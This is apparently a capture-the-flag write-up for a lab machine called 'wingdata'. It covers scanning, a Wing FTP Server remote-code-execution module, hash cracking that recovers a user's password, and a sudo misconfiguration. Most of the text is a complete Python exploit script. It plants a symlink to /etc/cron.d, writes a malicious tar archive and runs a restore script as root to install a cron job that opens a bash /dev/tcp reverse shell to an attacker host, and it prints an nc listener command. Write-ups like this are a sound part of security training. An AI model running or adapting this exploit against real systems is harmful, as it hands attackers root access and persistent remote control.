## Nmap scan

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-25 10:53 EDT
Nmap scan report for 10.129.244.106
Host is up (0.0077s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Port 80 (wingdata.htb)

The only interesting thing is the ability to send a message, which does a POST — nothing seems injectable to the naked eye. It has a subdomain `ftp.wingdata.htb`.

- It has a login page
- It is powered by **Wing FTP Server v7.4.3**
- Found a vulnerable exploit: `exploit(multi/http/wingftp_null_byte_rce)`
- Got a shell for remote code execution
- Home directory is `/opt/wingftp` but doesn't exist
- Can't get into wacky's user directory
- Dropped me into `/opt/wingftpserver`
- Found some user files in `/opt/wingftpserver/Data/1/users/wacky.xml`
- Found the salt in `/opt/wingftpserver/Data/1/settings.xml`, which was `WingFTP`
- Used hashcat to find the password `!#7Blushing^*Bride5`
- Able to log in as **wacky**
- `sudo -l` gives me:

```text
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

- Had to use a widely available PoC specifically made for the box (`CVE-2025-4517`).
- **Lesson learned:** the modern world is leaning toward AI; don't be scared to let it do the heavy lifting. I spent hours trying to figure out an exploit that AI made in 3 minutes.
- Reference PoC: [CVE-2025-4517-POC](https://github.com/AzureADTrent/CVE-2025-4517-POC)

## My exploit

```python
#!/usr/bin/env python3
"""
Exploit: Symlink attack on backup restore script.

Vulnerability: The script runs as root via sudo and extracts a tar archive
into a staging directory without checking if that directory is a symlink.
The filter="data" only sanitizes tar member paths - it does NOT verify
that the extraction destination itself is legitimate.

Attack flow:
  1. Create a tar file containing a malicious payload (e.g., cron job)
  2. Symlink the staging restore dir to a sensitive directory (e.g., /etc/cron.d)
  3. Run the vulnerable script via sudo - files are extracted as root
     into the symlink target, achieving arbitrary file write as root.
"""

import tarfile
import os
import sys
import io
import argparse
import subprocess

BACKUP_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"


def create_payload_tar(tar_path, filename, content):
    """Create a tar archive containing a single file with the given content."""
    data = content.encode()
    info = tarfile.TarInfo(name=filename)
    info.size = len(data)
    info.mode = 0o644
    with tarfile.open(tar_path, "w") as tar:
        tar.addfile(info, io.BytesIO(data))
    print(f"[+] Malicious tar created: {tar_path}")
    print(f"    Contains: {filename} ({len(data)} bytes)")


def main():
    parser = argparse.ArgumentParser(
        description="Exploit symlink vulnerability in backup restore script"
    )
    parser.add_argument("--target-dir", default="/etc/cron.d",
                        help="Directory to write into via symlink (default: /etc/cron.d)")
    parser.add_argument("--lhost", default="127.0.0.1",
                        help="Attacker IP for reverse shell (default: 127.0.0.1)")
    parser.add_argument("--lport", default="4444",
                        help="Attacker port for reverse shell (default: 4444)")
    parser.add_argument("--client-id", default="9999",
                        help="Client ID for the tar filename (default: 9999)")
    parser.add_argument("--restore-tag", default="restore_pwned",
                        help="Restore directory name (default: restore_pwned)")
    parser.add_argument("--script-path", required=True,
                        help="Path to the vulnerable restore_backup.py script")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show what would be done without executing")
    args = parser.parse_args()

    tar_name = f"backup_{args.client_id}.tar"
    tar_path = os.path.join(BACKUP_DIR, tar_name)
    symlink_path = os.path.join(STAGING_BASE, args.restore_tag)

    # Step 1: craft the malicious tar (cron reverse shell, fires every minute)
    cron_payload = (
        f"* * * * * root bash -c "
        f"'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'\n"
    )
    print("[*] Step 1 - Creating malicious tar with cron reverse shell payload")
    if not args.dry_run:
        create_payload_tar(tar_path, "pwned", cron_payload)
    else:
        print(f"    Would create: {tar_path}")
        print(f"    Payload:\n    {cron_payload.strip()}")

    # Step 2: plant the symlink
    print(f"[*] Step 2 - Symlinking restore dir to {args.target_dir}")
    print(f"    {symlink_path} -> {args.target_dir}")
    if not args.dry_run:
        if os.path.islink(symlink_path):
            os.unlink(symlink_path)
        elif os.path.isdir(symlink_path):
            print(f"[!] {symlink_path} already exists as a real directory - aborting")
            sys.exit(1)
        os.symlink(args.target_dir, symlink_path)
        print("[+] Symlink created")

    # Step 3: trigger the vulnerable script via sudo
    cmd = ["sudo", "python3", args.script_path, "-b", tar_name, "-r", args.restore_tag]
    print("[*] Step 3 - Running vulnerable script as root")
    print(f"    Command: {' '.join(cmd)}")
    if not args.dry_run:
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        if result.returncode != 0:
            print(f"[!] Script failed:\n{result.stderr}", file=sys.stderr)
            sys.exit(1)

    print()
    print("=" * 60)
    print("[*] EXPLOIT SUMMARY")
    print("=" * 60)
    print(f"  Tar file:       {tar_path}")
    print(f"  Symlink:        {symlink_path} -> {args.target_dir}")
    print(f"  Payload file:   {args.target_dir}/pwned")
    print("  Effect:         Cron runs reverse shell every minute as root")
    print()
    print(f"  Start listener: nc -lvnp {args.lport}")
    print("=" * 60)


if __name__ == "__main__":
    main()
```
